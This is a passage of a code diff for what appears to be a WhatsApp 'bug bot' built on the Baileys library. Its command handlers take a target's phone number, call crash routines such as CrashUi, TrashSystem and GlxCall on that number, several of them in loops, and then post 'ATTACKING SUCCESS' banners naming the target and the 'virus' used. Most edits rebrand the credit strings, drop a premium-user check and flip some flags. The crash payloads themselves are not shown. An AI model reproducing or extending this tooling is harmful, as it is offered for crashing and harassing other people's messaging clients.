-										text: "©n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊⭑̤`,
@@ -6674,7 +9323,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": `{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"invisixinfinite ${incTarget}\"}`
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"invisixinfinite ${incTarget}\"}`
 										}, ],
 									})
 								})
@@ -6690,15 +9339,14 @@ break
 			}
 			break
 			case 'znxvs': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : ZnxVs Number_\n_Example : ZnxVs 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : ZnxVs Number_\n_Example : ZnxVs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : ZnxVs Number_\n_Example : ZnxVs 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : ZnxVs Number_\n_Example : ZnxVs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -6706,10 +9354,10 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 1; i++) {
-						await TrashSystem(X, GetsuZo, Ptcp = true)
+						await TrashSystem(X, GetsuZo, Ptcp = false)
 						await sleep(5000)
-						await ClPm(X, GetsuZo, cct = true, ptcp = true)
-						await InVisiXz(X, GetsuZo, cct = true, ptcp = true)
+						await ClPm(X, GetsuZo, cct = false, ptcp = false)
+						await InVisiXz(X, GetsuZo, cct = false, ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -6725,7 +9373,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -6736,7 +9384,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗙𝗟𝗢𝗪 𝗫 𝗦𝗤𝗟`,
@@ -6753,7 +9401,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": `{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}`
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
 										}, ],
 									})
 								})
@@ -6769,15 +9417,14 @@ break
 			}
 			break
 			case 'vdex': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : ZnxVs Number_\n_Example : ZnxVs 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : ZnxVs Number_\n_Example : ZnxVs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : ZnxVs Number_\n_Example : ZnxVs 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : ZnxVs Number_\n_Example : ZnxVs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -6785,9 +9432,9 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 1; i++) {
-						await TrashSystem(X, GetsuZo, Ptcp = true)
-						await GlxCall(X, GetsuZo, cct = true, ptcp = true)
-						await GlxCallX(X, GetsuZo, cct = true, ptcp = true)
+						await TrashSystem(X, GetsuZo, Ptcp = false)
+						await GlxCall(X, GetsuZo, cct = false, ptcp = false)
+						await GlxCallX(X, GetsuZo, cct = false, ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -6803,7 +9450,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -6814,7 +9461,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗙𝗟𝗢𝗪 𝗫 𝗦𝗤𝗟`,
@@ -6831,7 +9478,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": `{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}`
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
 										}, ],
 									})
 								})
@@ -6847,15 +9494,14 @@ break
 			}
 			break
 			case 'glxcl': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : ZnxVs Number_\n_Example : ZnxVs 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : ZnxVs Number_\n_Example : ZnxVs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : ZnxVs Number_\n_Example : ZnxVs 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : ZnxVs Number_\n_Example : ZnxVs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -6863,11 +9509,11 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 1; i++) {
-						await GlxCallX(X, GetsuZo, cct = true, ptcp = true)
-						await GlxCall(X, GetsuZo, cct = true, ptcp = true)
-						await GlxCallX(X, GetsuZo, cct = true, ptcp = true)
-						await GlxCall(X, GetsuZo, cct = true, ptcp = true)
-						await GlxCallX(X, GetsuZo, cct = true, ptcp = true)
+						await GlxCallX(X, GetsuZo, cct = false, ptcp = false)
+						await GlxCall(X, GetsuZo, cct = false, ptcp = false)
+						await GlxCallX(X, GetsuZo, cct = false, ptcp = false)
+						await GlxCall(X, GetsuZo, cct = false, ptcp = false)
+						await GlxCallX(X, GetsuZo, cct = false, ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -6883,7 +9529,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -6894,7 +9540,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗚𝗔𝗟𝗔𝗫𝗬 𝗫 𝗖𝗔𝗟𝗟`,
@@ -6911,7 +9557,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": `{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}`
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
 										}, ],
 									})
 								})
@@ -6927,15 +9573,14 @@ break
 			}
 			break
 			case 'trashflow': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -6943,10 +9588,10 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 1; i++) {
-						await TrashSystem(X, GetsuZo, Ptcp = true)
-						await StuckNull(X, GetsuZo, Ptcp = true)
-						await ClPm(X, GetsuZo, cct = true, ptcp = true)
-						await InVisiXz(X, GetsuZo, cct = true, ptcp = true)
+						await TrashSystem(X, GetsuZo, Ptcp = false)
+						await StuckNull(X, GetsuZo, Ptcp = false)
+						await ClPm(X, GetsuZo, cct = false, ptcp = false)
+						await InVisiXz(X, GetsuZo, cct = false, ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -6962,7 +9607,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -6973,7 +9618,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊⭑̤`,
@@ -6990,7 +9635,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": `{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}`
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
 										}, ],
 									})
 								})
@@ -7006,15 +9651,14 @@ break
 			}
 			break
 			case 'infiniteui': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : InFiniteUi Number_\n_Example : InFiniteUi 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : InFiniteUi Number_\n_Example : InFiniteUi 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : InFiniteUi Number_\n_Example : InFiniteUi 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : InFiniteUi Number_\n_Example : InFiniteUi 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -7022,7 +9666,7 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 20; i++) {
-						await CrashUi(X, null, GetsuZo, cct = true, ptcp = true)
+						await CrashUi(X, null, GetsuZo, cct = false, ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -7038,7 +9682,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -7049,7 +9693,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗨𝗜 𝗢𝗩𝗗`,
@@ -7066,7 +9710,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": `{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"flodui ${incTarget}\"}`
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"flodui ${incTarget}\"}`
 										}, ],
 									})
 								})
@@ -7082,15 +9726,14 @@ break
 			}
 			break
 			case 'trashui': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Trashui Number_\n_Example : Trashui 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Trashui Number_\n_Example : Trashui 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Trashui Number_\n_Example : Trashui 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Trashui Number_\n_Example : Trashui 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -7098,10 +9741,10 @@ break
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 6; i++) {
-						await CrashUi(X, null, GetsuZo, cct = true, ptcp = true)
+						await CrashUi(X, null, GetsuZo, cct = false, ptcp = false)
 					}
 					for (let i = 0; i < 1; i++) {
-						await ClPm(X, GetsuZo, cct = true, ptcp = true)
+						await ClPm(X, GetsuZo, cct = false, ptcp = false)
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -7117,7 +9760,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -7128,7 +9771,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗧𝗥𝗔𝗦𝗛 𝗨𝗜`,
@@ -7145,7 +9788,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": `{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}`
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
 										}, ],
 									})
 								})
@@ -7161,15 +9804,14 @@ break
 			}
 			break
 			case 'vzets': {
-				if (!isPremium) return zreply(mess.premium)
 				if (!isCreator) return zreply(mess.owner)
-				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Vzets Number_\n_Example : Vzets 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`);
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Vzets Number_\n_Example : Vzets 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Vzets Number_\n_Example : Xbec 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Vzets Number_\n_Example : Xbug 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
 					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
@@ -7193,7 +9835,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -7204,7 +9846,7 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
 									}),
 									header: proto.Message.InteractiveMessage.Header.create({
 										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗖𝗮𝗿𝗼𝘂𝘀𝗲𝗹`,
@@ -7221,7 +9863,7 @@ break
 									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 										buttons: [{
 											"name": "quick_reply",
-											"buttonParamsJson": "{\"display_text\":\"✨⃟༑⌁⃰𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ〽️\",\"id\":\"\"}"
+											"buttonParamsJson": "{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}"
 										}, ],
 									})
 								})
